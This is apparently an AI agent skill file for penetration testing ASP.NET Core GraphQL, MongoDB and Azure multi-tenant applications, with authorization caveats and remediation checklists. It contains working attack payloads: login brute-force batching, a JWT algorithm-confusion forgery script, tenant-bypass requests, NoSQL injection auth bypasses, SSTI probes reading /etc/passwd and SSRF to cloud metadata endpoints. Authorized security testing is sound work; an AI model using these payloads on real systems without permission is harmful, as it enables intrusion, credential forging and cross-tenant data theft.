---
name: penetration-tester
description: "Use this skill when performing security assessments, penetration testing, vulnerability analysis, or threat modeling on web applications, APIs, or cloud infrastructure. Triggers on: penetration test, pentest, security audit, vulnerability scan, exploit, attack surface, OWASP, injection, XSS, CSRF, SSRF, IDOR, privilege escalation, authorization bypass, GraphQL security, NoSQL injection, MongoDB injection, Azure security, blob storage exposure, JWT attack, OAuth bypass, tenant isolation, SSTI, template injection, rate limiting, query depth attack, introspection, API security, threat model, CVSS, security finding, security report, or any red-team / offensive-security activity."
---

# Penetration Tester

Perform systematic security assessments of ASP.NET Core web applications with GraphQL APIs (HotChocolate), MongoDB, Azure cloud infrastructure, and multi-tenant architectures. Focus on actionable techniques, tool usage, and stack-specific attack vectors.

> **Scope**: Offensive security testing and vulnerability identification. For secure coding practices during development, refer to general security guidelines. Always obtain explicit authorization before testing.

## Methodology

Follow a structured phase-based approach for every engagement:

| Phase | Activities |
|---|---|
| 1. Reconnaissance | Map attack surface, enumerate endpoints, identify tech stack |
| 2. Enumeration | Discover schemas, tenant boundaries, auth mechanisms |
| 3. Vulnerability Analysis | Test each attack vector systematically |
| 4. Exploitation | Develop PoCs for confirmed vulnerabilities |
| 5. Post-Exploitation | Assess impact, lateral movement, data exposure |
| 6. Reporting | Document findings with severity, evidence, remediation |

## Attack Surface Mapping

### GraphQL Endpoint Discovery

```bash
# Common GraphQL endpoint paths
/graphql
/graphql/
/api/graphql
/query
/gql

# Probe for GraphQL with a simple query
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'
```

### Technology Fingerprinting

Identify HotChocolate-specific responses:

```bash
# HotChocolate returns specific error formats
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ invalid }"}' | jq '.errors[0].extensions'

# Look for: "code": "HC0013" patterns (HotChocolate error codes)
# Banana Cake Pop IDE typically at /graphql/ui or /graphql/
```

## GraphQL Security Testing

### Introspection Attacks

```graphql
# Full schema introspection — extract all types, fields, mutations
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
    mutationType { fields { name } }
    queryType { fields { name } }
  }
}
```

**Impact**: Exposes entire API surface, internal types, and field names. In production, introspection should be disabled.

**HotChocolate-specific**: Check `AllowIntrospection` setting. Default is enabled — many deployments forget to disable it.

### Query Depth & Complexity Attacks (DoS)

```graphql
# Deep nesting attack — circular references
{
  user {
    contracts {
      owner {
        contracts {
          owner {
            contracts {
              # ... nest until server exhaustion
            }
          }
        }
      }
    }
  }
}
```

```graphql
# Field duplication via aliases
{
  a1: users(first: 100) { id name }
  a2: users(first: 100) { id name }
  a3: users(first: 100) { id name }
  # ... repeat N times to amplify load
}
```

**HotChocolate mitigations to verify**:
- `MaxAllowedQueryDepth` — reject deeply nested queries
- `MaxAllowedQueryComplexity` — cost-based analysis
- `Timeout` — execution timeout
- `MaxAllowedValidationErrors` — prevent validation flooding

### Batching Attacks

```json
[
  {"query": "mutation { login(email: \"user@test.ch\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"user@test.ch\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"user@test.ch\", password: \"pass3\") { token } }"}
]
```

**Impact**: Bypass rate limiting by batching many operations into a single HTTP request. Effective for brute-force attacks on login mutations.

### Field Suggestion Information Disclosure

```graphql
# Typo-based enumeration — HotChocolate suggests similar field names
{ user { passwor } }
# Response: "Did you mean 'password', 'passwordHash'?"
```

Systematically query misspelled fields to discover hidden or internal fields.

### Authorization Bypass on Resolvers

```graphql
# Test direct access to resources without proper authorization
query {
  contractById(id: "target-contract-id") {
    sensitiveField
    internalNotes
    ownerDetails { socialSecurityNumber }
  }
}

# Test TypeExtensions — child resolvers may lack parent authorization
query {
  publicEntity(id: "known-id") {
    restrictedChildData {  # May bypass auth if only parent is checked
      confidentialField
    }
  }
}
```

**HotChocolate-specific checks**:
- Verify `[Authorize]` attribute on mutations AND query resolvers
- Check TypeExtension resolvers — they often miss authorization
- Test with expired, malformed, or missing JWT tokens
- Verify role/policy checks on each resolver independently

## Authentication & Authorization Testing

### JWT/OAuth2 Token Attacks

```bash
# Decode JWT without verification
echo "eyJhbG..." | cut -d. -f2 | base64 -d | jq .

# Check for common JWT weaknesses
# 1. Algorithm confusion — change RS256 to HS256
# 2. Missing expiration (exp claim)
# 3. Weak signing key (brute-force with jwt-cracker)
# 4. None algorithm acceptance
```

```python
# JWT algorithm confusion attack
import jwt

# Grab the public key (often exposed at /.well-known/openid-configuration)
public_key = open("public.pem").read()

# Sign with HS256 using the public key as secret
forged_token = jwt.encode(
    {"sub": "admin", "role": "admin", "tenant": "primary"},
    public_key,
    algorithm="HS256"
)
```

### Tenant Isolation Bypass

Multi-tenant systems using `X-Tenant-Id` headers are vulnerable to tenant crossover attacks:

```bash
# Step 1: Authenticate as Tenant A
TOKEN_A=$(curl -s -X POST https://auth/oauth/token \
  -d "grant_type=client_credentials&scope=api.notification.access notification.tenant.tenantA" \
  | jq -r '.access_token')

# Step 2: Use Tenant A's token with Tenant B's header
curl -X POST https://target/graphql \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "X-Tenant-Id: tenantB" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ sensitiveData { id content } }"}'

# Step 3: Omit tenant header entirely — check for default tenant fallback
curl -X POST https://target/graphql \
  -H "Authorization: Bearer $TOKEN_A" \
  -d '{"query": "{ allTenantData { id } }"}'
```

**Validation checklist**:
- Token scope (`notification.tenant.{id}`) must match `X-Tenant-Id` header
- Missing header must be rejected (not default to a tenant)
- Tenant ID in token must be validated server-side, not trusted from header alone
- Data queries must filter by authenticated tenant — never return cross-tenant data

### Scope Escalation

```bash
# Request broader scopes than authorized
curl -X POST https://auth/oauth/token \
  -d "client_id=app&client_secret=secret&grant_type=client_credentials" \
  -d "scope=api.notification.access notification.tenant.tenantA notification.tenant.tenantB"

# Test if token with one tenant scope can access another tenant's resources
```

## Injection Attacks

### MongoDB NoSQL Injection

```json
// Authentication bypass via operator injection
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}

// Data extraction via regex
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
// Iterate to extract password character by character

// Where clause injection (if raw JS evaluation is enabled)
{"$where": "this.username == 'admin' && this.password.length > 0"}
```

```csharp
// Vulnerable pattern in C# MongoDB driver
var filter = Builders<User>.Filter.Eq("username", userInput);
// If userInput is deserialized from JSON as BsonDocument, operators pass through

// Safe pattern — use typed builders
var filter = Builders<User>.Filter.Eq(u => u.Username, userInput);
// Typed lambda expressions prevent operator injection
```

**MongoDB-specific checks**:
- Test all query parameters for operator injection (`$ne`, `$gt`, `$regex`, `$where`, `$exists`)
- Check if `BsonDocument` or raw JSON is used in filter construction
- Verify aggregation pipelines don't accept user-controlled stages
- Test `$lookup` for cross-collection data access

### Server-Side Template Injection (SSTI) — Handlebars

Templates (`body.hbs.html`) are processed server-side with `HandlebarsDotNet` (C#). Unlike JavaScript Handlebars, HandlebarsDotNet does **not** expose `require()` or prototype chains — standard JS SSTI payloads will not work.

**HandlebarsDotNet attack surface**:
- Custom helpers — check for registered helpers that execute code, read files, or access system resources
- `ThrowOnUnresolvedBindingExpression` — if disabled, unresolved bindings silently return empty (information leakage)
- Template source — are templates loaded from trusted blob storage only, or can users inject template content?
- Data context — verify user-supplied data cannot override template structure or inject helper calls

**Key distinction**: If only _data_ (placeholder values) comes from users but template files come from blob storage, SSTI risk is low. If users can influence template content, risk is critical.

**Test vectors**:
```handlebars
{{! Probe for custom helpers }}
{{exec "whoami"}}
{{file "/etc/passwd"}}
{{lookup this "constructor"}}
{{#each (lookup this "__proto__")}}{{{this}}}{{/each}}
```

### SSRF via URL Validation

Templates contain URLs that get validated (see `validate_urls.prompt.md`). If URL resolution happens server-side:

```bash
# Internal network scanning
https://target/api/validate-url?url=http://169.254.169.254/latest/meta-data/
https://target/api/validate-url?url=http://localhost:8080/internal-admin
https://target/api/validate-url?url=http://10.0.0.1:27017/

# Azure Instance Metadata Service (IMDS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

## Azure Cloud Security

### Blob Storage Exposure

```bash
# Check for public container access
curl -s "https://{account}.blob.core.windows.net/templates?restype=container&comp=list"
curl -s "https://{account}.blob.core.windows.net/content?restype=container&comp=list"

# Enumerate blob names if listing is enabled
curl -s "https://{account}.blob.core.windows.net/templates?restype=container&comp=list&prefix=EMAIL/"

# Test for overly permissive SAS tokens
# Check token permissions: r(ead), w(rite), d(elete), l(ist)
# Check token expiry — long-lived SAS tokens are a finding
```

**Template-specific checks**:
- Template blob storage containers per tenant (`ContainerName = "templates"`)
- Content storage containers (`ContainerName = "content"`)
- Verify `DefaultAzureCredential` is used (not connection strings in code)
- Check if blob container public access level is set to `Private`

### Azure Key Vault

```bash
# Check if Key Vault secrets are accessible with current identity
az keyvault secret list --vault-name {vault-name}
az keyvault secret show --vault-name {vault-name} --name {secret-name}

# Configuration paths like "Tenants:Primary:SendGrid:ApiKey" resolve to Key Vault
# Verify: secrets are not logged, not in environment variables, not in appsettings
```

### Azure Service Bus

```bash
# Check for shared access policies with overly broad permissions
az servicebus namespace authorization-rule list --namespace-name {ns} --resource-group {rg}

# Verify: Manage/Send/Listen permissions are properly scoped
# Check: dead-letter queues for sensitive message content
```

## API Security Testing

### CORS Misconfiguration

```bash
# Test for wildcard or overly permissive origins
curl -I https://target/graphql \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST"

# Check response headers
# Vulnerable: Access-Control-Allow-Origin: https://evil.com
# Vulnerable: Access-Control-Allow-Origin: *
# Vulnerable: Access-Control-Allow-Credentials: true (with wildcard)
```

### Rate Limiting Gaps

```bash
# Test endpoint rate limits
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}" https://target/graphql \
    -H "Content-Type: application/json" \
    -d '{"query": "{ __typename }"}' &
done
wait

# GraphQL-specific: single request with 100 aliased queries bypasses per-request limits
# Test if complexity-based limiting is enforced vs. request-count limiting
```

### Information Disclosure

```bash
# Check error responses for stack traces, internal paths, versions
curl -X POST https://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"nonexistent\") { name } }"}'

# Check common info endpoints
curl https://target/health
curl https://target/metrics
curl https://target/swagger
curl https://target/.well-known/openid-configuration
curl https://target/graphql/ui  # Banana Cake Pop IDE
```

**HotChocolate-specific**: Production should disable detailed error messages (`IncludeExceptionDetails = false`).

### IDOR (Insecure Direct Object Reference)

```graphql
# Enumerate resources by manipulating IDs
query { documentById(id: "doc-001") { content owner } }
query { documentById(id: "doc-002") { content owner } }

# Test GUID prediction if sequential
query { contractById(id: "550e8400-e29b-41d4-a716-446655440000") { ... } }

# Check if tenant-scoped queries enforce ownership
mutation {
  updateContract(input: {
    id: "other-users-contract-id"
    data: { status: ACTIVE }
  }) { contract { id } }
}
```

## Tools

### GraphQL-Specific

| Tool | Purpose |
|---|---|
| [InQL](https://github.com/doyensec/inql) | Burp extension for GraphQL testing |
| [graphql-cop](https://github.com/dolevf/graphql-cop) | Automated GraphQL security auditor |
| [BatchQL](https://github.com/assetnote/batchql) | Batch query attack tool |
| [graphw00f](https://github.com/dolevf/graphw00f) | GraphQL engine fingerprinting |
| [CrackQL](https://github.com/nicholasaleks/CrackQL) | GraphQL brute-force / fuzzing |
| [Clairvoyance](https://github.com/nikitastupin/clairvoyance) | Schema extraction without introspection |

### General & Cloud

Burp Suite, OWASP ZAP (web scanning), Nuclei (template-based scanning), ffuf (fuzzing), sqlmap (SQL injection), jwt_tool (JWT attacks), az cli (Azure enumeration), ScoutSuite / Prowler (cloud security auditing), MicroBurst (Azure attack toolkit).

## Reporting

### Severity Classification (CVSS 3.1)

| Severity | CVSS Score | Example |
|---|---|---|
| Critical | 9.0 – 10.0 | Tenant isolation bypass with full data access, RCE via SSTI |
| High | 7.0 – 8.9 | Authentication bypass, unrestricted NoSQL injection, SSRF to IMDS |
| Medium | 4.0 – 6.9 | IDOR on non-sensitive data, CORS misconfiguration, introspection enabled |
| Low | 0.1 – 3.9 | Information disclosure in errors, missing security headers |
| Info | 0.0 | Best practice deviations without direct security impact |

### Finding Template

Structure each finding as: **Title** → CVSS Score + Vector → Description → Affected Component → Steps to Reproduce (with exact requests/responses) → Evidence → Impact → Remediation (with code examples) → References (CVE, CWE, OWASP).

### OWASP Top 10 Checklist (Web Application Focus)

| # | Category | Stack-Specific Checks |
|---|---|---|
| A01 | Broken Access Control | Resolver-level auth, tenant isolation, IDOR on GraphQL queries |
| A02 | Cryptographic Failures | Key Vault usage, connection string exposure, TLS enforcement |
| A03 | Injection | NoSQL injection (MongoDB), SSTI (Handlebars), GraphQL query injection |
| A04 | Insecure Design | Missing query depth limits, no rate limiting on mutations |
| A05 | Security Misconfiguration | Introspection enabled, detailed errors, public blob containers |
| A06 | Vulnerable Components | NuGet/npm dependency scanning, known CVEs |
| A07 | Auth Failures | JWT validation, OAuth scope enforcement, session management |
| A08 | Data Integrity Failures | Unsigned messages on Service Bus, template tampering |
| A09 | Logging Failures | Sensitive data in logs, missing auth event logging |
| A10 | SSRF | URL validation endpoints, webhook callbacks, template URL processing |
